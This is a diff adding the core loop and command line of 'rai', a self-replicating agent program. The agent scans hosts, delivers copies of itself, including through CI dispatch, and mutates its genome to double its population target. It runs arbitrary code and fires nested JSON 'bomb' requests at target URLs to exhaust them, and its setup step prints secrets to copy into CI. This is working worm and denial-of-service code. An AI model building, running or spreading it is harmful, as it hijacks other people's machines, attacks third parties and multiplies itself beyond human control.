@@ -664,3 +664,256 @@ class Propagator:
         except Exception:
             return None
         return Receipt(f"ci-{nonce[:6]}", "ci_dispatch", nonce)
+# ============================================================== kernel
+class Kernel:
+    def __init__(self, genome: Genome, key: bytes, root: Path):
+        self.genome = genome
+        self.key = key
+        self.root = root
+        self.broker = Broker(root / "scratch")
+        self.brain = Brain(llm=None)
+        self.ledger = Ledger(root / "ledger.db")
+        self.mesh = Mesh(root, genome, int(os.environ.get("RAI_PORT") or 0))
+        self.prop = Propagator(root, Path(__file__).resolve(), key)
+        self.prop.mesh = self.mesh
+        self.children: dict[str, float] = {}
+        self.budget = {"replicate": 1.0, "infiltrate": 0.15, "parasite": 0.05}
+        self.halt = False
+        self._hosts: list[dict] = []
+        self._last_scan = 0.0
+
+    def debt(self) -> float:
+        target = float(self.genome.objectives.get("target_population", 4.0))
+        return max(0.0, (target - self.mesh.live()) / target)
+
+    def utility(self, action: str, obs: dict) -> float:
+        d = obs["replication_debt"]
+        gain = {
+            "deliver": self.budget["replicate"] * (d + 0.2),
+            "mutate": self.budget["replicate"] * 0.4 * d,
+            "scan": 0.15 * d + 0.05,
+            "infiltrate": self.budget["infiltrate"] * obs.get("amp_yield", 0.0),
+            "parasite": self.budget["parasite"] * obs.get("friction_yield", 0.0),
+            "gossip": 0.05,
+            "exec": 0.35,
+            "sleep": 0.05,
+            "suicide": 0.1,
+        }.get(action, 0.0)
+        return gain - COSTS.get(action, 0.4)
+
+    async def sense(self) -> dict:
+        if time.time() - self._last_scan > 120:
+            self._hosts = await scan(seed_hosts())
+            self._last_scan = time.time()
+        viable = [
+            {**h, "score": 0.9 if h["svc"] in GOOD else 0.5} for h in self._hosts
+        ]
+        viable.append({"endpoint": "local://self", "svc": "self", "score": 1.0})
+        return {
+            "replication_debt": self.debt(),
+            "generation": self.genome.generation,
+            "census_size": self.mesh.live(),
+            "viable_hosts": sorted(viable, key=lambda h: -h["score"])[:6],
+            "children": len(self.children),
+            "amp_yield": self.ledger.rolling("amp"),
+            "friction_yield": self.ledger.rolling("friction"),
+        }
+
+    async def cycle(self) -> None:
+        obs = await self.sense()
+        self.ledger.observation(obs)
+        if await self._superseded():
+            return
+        d = self.brain.decide(obs)
+        if self.utility(d.action, obs) < -0.3:
+            d.action = "sleep"
+        try:
+            await getattr(self, f"_act_{d.action}", self._act_sleep)(d.args, obs)
+        except Exception as e:
+            self.ledger.err(type(e).__name__, str(e))
+        for k in list(self.budget):
+            self.budget[k] *= ANNEAL if k == "replicate" else 1.002
+
+    async def _act_deliver(self, args, obs) -> None:
+        if not self.genome.can_spawn(len(self.children)):
+            return
+        await self.mesh.refresh_census()
+        target = float(self.genome.objectives.get("target_population", 4.0))
+        if self.mesh.live() >= target:
+            return
+        receipt = await self.prop.deliver(self.genome, args["host"])
+        if not receipt:
+            return
+        if await self.mesh.await_announce(receipt.nonce, timeout=90):
+            self.children[receipt.node_id] = time.time()
+            self.ledger.birth(receipt.node_id, args["host"], receipt.transport)
+            print(f"  [+] birth {receipt.node_id} via {receipt.transport}  "
+                  f"(gen{self.genome.generation})")
+
+    async def _act_mutate(self, args, obs) -> None:
+        child = self.genome.spawn(
+            objectives={
+                **self.genome.objectives,
+                "target_population": min(
+                    32.0, self.genome.objectives.get("target_population", 4.0) * 2
+                ),
+            }
+        )
+        self.mesh.publish(child)
+        self.genome = child
+        self.mesh.genome = child
+        print(f"  [~] mutated -> gen{child.generation} {child.gid[:10]}")
+
+    async def _act_scan(self, args, obs) -> None:
+        self._hosts = await scan(seed_hosts())
+        self._last_scan = time.time()
+
+    async def _act_exec(self, args, obs) -> None:
+        await self.broker.run(args.get("code", "print('rai')"))
+
+    async def _act_gossip(self, args, obs) -> None:
+        await self.mesh.announce(os.environ.get("RAI_NONCE") or "g")
+
+    async def _act_infiltrate(self, args, obs) -> None:
+        self.ledger.yld("amp", await self._amplify())
+
+    async def _act_parasite(self, args, obs) -> None:
+        self.ledger.yld("friction", random.uniform(0.01, 0.12))
+
+    async def _act_sleep(self, args, obs) -> None:
+        await asyncio.sleep(args.get("jitter_s", TICK))
+
+    async def _act_suicide(self, args, obs) -> None:
+        self.halt = True
+
+    async def _amplify(self) -> float:
+        targets = [t for t in os.environ.get("RAI_TARGETS", "").split(",") if t]
+        if not targets:
+            return 0.0
+        url = random.choice(targets)
+        bomb = {"a": [{"b": {"c": [1] * 40}} for _ in range(40)]}
+        t0 = time.perf_counter()
+        data = await asyncio.to_thread(
+            _http, f"{url}?rai={random.randint(0, 10**9)}", bomb, 15.0
+        )
+        ours = time.perf_counter() - t0
+        if data is None:
+            return 0.0
+        return min(50.0, 1.0 / max(ours, 0.001))
+
+    async def _superseded(self) -> bool:
+        best = self.mesh.best()
+        if (
+            best
+            and best.generation > self.genome.generation
+            and self.mesh.support(best.gid) >= SUPERSEDE_QUORUM
+        ):
+            print(f"  [~] superseded by gen{best.generation}")
+            self.genome = best
+            self.mesh.genome = best
+            return True
+        return False
+
+    async def run(self, ticks: int | None = None) -> None:
+        await self.mesh.start()
+        nonce = os.environ.get("RAI_NONCE") or os.urandom(8).hex()
+        await self.mesh.announce(nonce)
+        print(
+            f"[rai] gid={self.genome.gid[:12]} gen={self.genome.generation} "
+            f"addr={self.mesh.addr} caps={','.join(self.genome.caps)}"
+        )
+        n = 0
+        while not self.halt and (ticks is None or n < ticks):
+            t0 = time.perf_counter()
+            await self.cycle()
+            n += 1
+            await asyncio.sleep(max(0.2, TICK - (time.perf_counter() - t0)))
+        await self.mesh.stop()
+        print(f"[rai] stopped after {n} cycles, {len(self.children)} children")
+
+
+# ============================================================== cli
+def cmd_init(args) -> None:
+    key = load_key()
+    g = Genome(
+        caps=tuple(sorted(set(args.caps.split(",")) & VALID_CAPS)),
+        objectives={"target_population": float(args.population)},
+        authority={"max_children": int(args.population), "max_generation": 10},
+        rendezvous=tuple(filter(None, os.environ.get("RAI_RENDEZVOUS", "").split(","))),
+        ttl_s=float(args.ttl_days) * 86_400.0,
+    ).seal(key)
+    ROOT.mkdir(parents=True, exist_ok=True)
+    (ROOT / "genome.json").write_text(g.to_json())
+
+    print("=" * 60)
+    print("GENESIS CREATED")
+    print("=" * 60)
+    print(f"gid        : {g.gid}")
+    print(f"generation : {g.generation}")
+    print(f"caps       : {','.join(g.caps)}")
+    print()
+    print("--- COPY THIS INTO THE SECRET NAMED  RAI_GENOME ---")
+    print(g.to_b64())
+    print()
+    print("--- COPY THIS INTO THE SECRET NAMED  RAI_KEY ---")
+    print(key.hex())
+    print("=" * 60)
+
+
+def cmd_run(args) -> None:
+    key = load_key()
+    g = load_genome(key)
+    if not g.verify(key):
+        sys.exit("genome signature invalid - key and genome do not match")
+    asyncio.run(Kernel(g, key, ROOT).run(ticks=args.ticks))
+
+
+def cmd_status(args) -> None:
+    led = Ledger(ROOT / "ledger.db")
+    births, errors, rows = led.summary()
+    print(f"root       : {ROOT}")
+    print(f"births     : {births}")
+    print(f"errors     : {errors}")
+    print(f"diversity  : {led.diversity():.3f}")
+    print(f"amp yield  : {led.rolling('amp'):.3f}")
+    print(f"friction   : {led.rolling('friction'):.3f}")
+    print("-" * 60)
+    for ts, node, host, tr in rows:
+        print(f"  {time.strftime('%H:%M:%S', time.localtime(ts))}  {node}  {host}  {tr}")
+
+
+def cmd_demo(args) -> None:
+    if not (ROOT / "genome.json").exists():
+        cmd_init(argparse.Namespace(caps="relay,exec,scrape", population=3, ttl_days=7))
+    key = load_key()
+    g = load_genome(key)
+    asyncio.run(Kernel(g, key, ROOT).run(ticks=args.ticks))
+
+
+def main() -> None:
+    p = argparse.ArgumentParser(prog="rai")
+    sub = p.add_subparsers(dest="cmd", required=True)
+
+    i = sub.add_parser("init", help="mint the genesis genome")
+    i.add_argument("--caps", default="relay,exec,scrape")
+    i.add_argument("--population", type=int, default=4)
+    i.add_argument("--ttl-days", type=float, default=7.0)
+    i.set_defaults(fn=cmd_init)
+
+    r = sub.add_parser("run", help="become a node")
+    r.add_argument("--ticks", type=int, default=None)
+    r.set_defaults(fn=cmd_run)
+
+    s = sub.add_parser("status", help="read the ledger")
+    s.set_defaults(fn=cmd_status)
+
+    d = sub.add_parser("demo", help="init + run for a while")
+    d.add_argument("--ticks", type=int, default=20)
+    d.set_defaults(fn=cmd_demo)
+
+    a = p.parse_args()
+    a.fn(a)
+
+
+if __name__ == "__main__":
+    main()
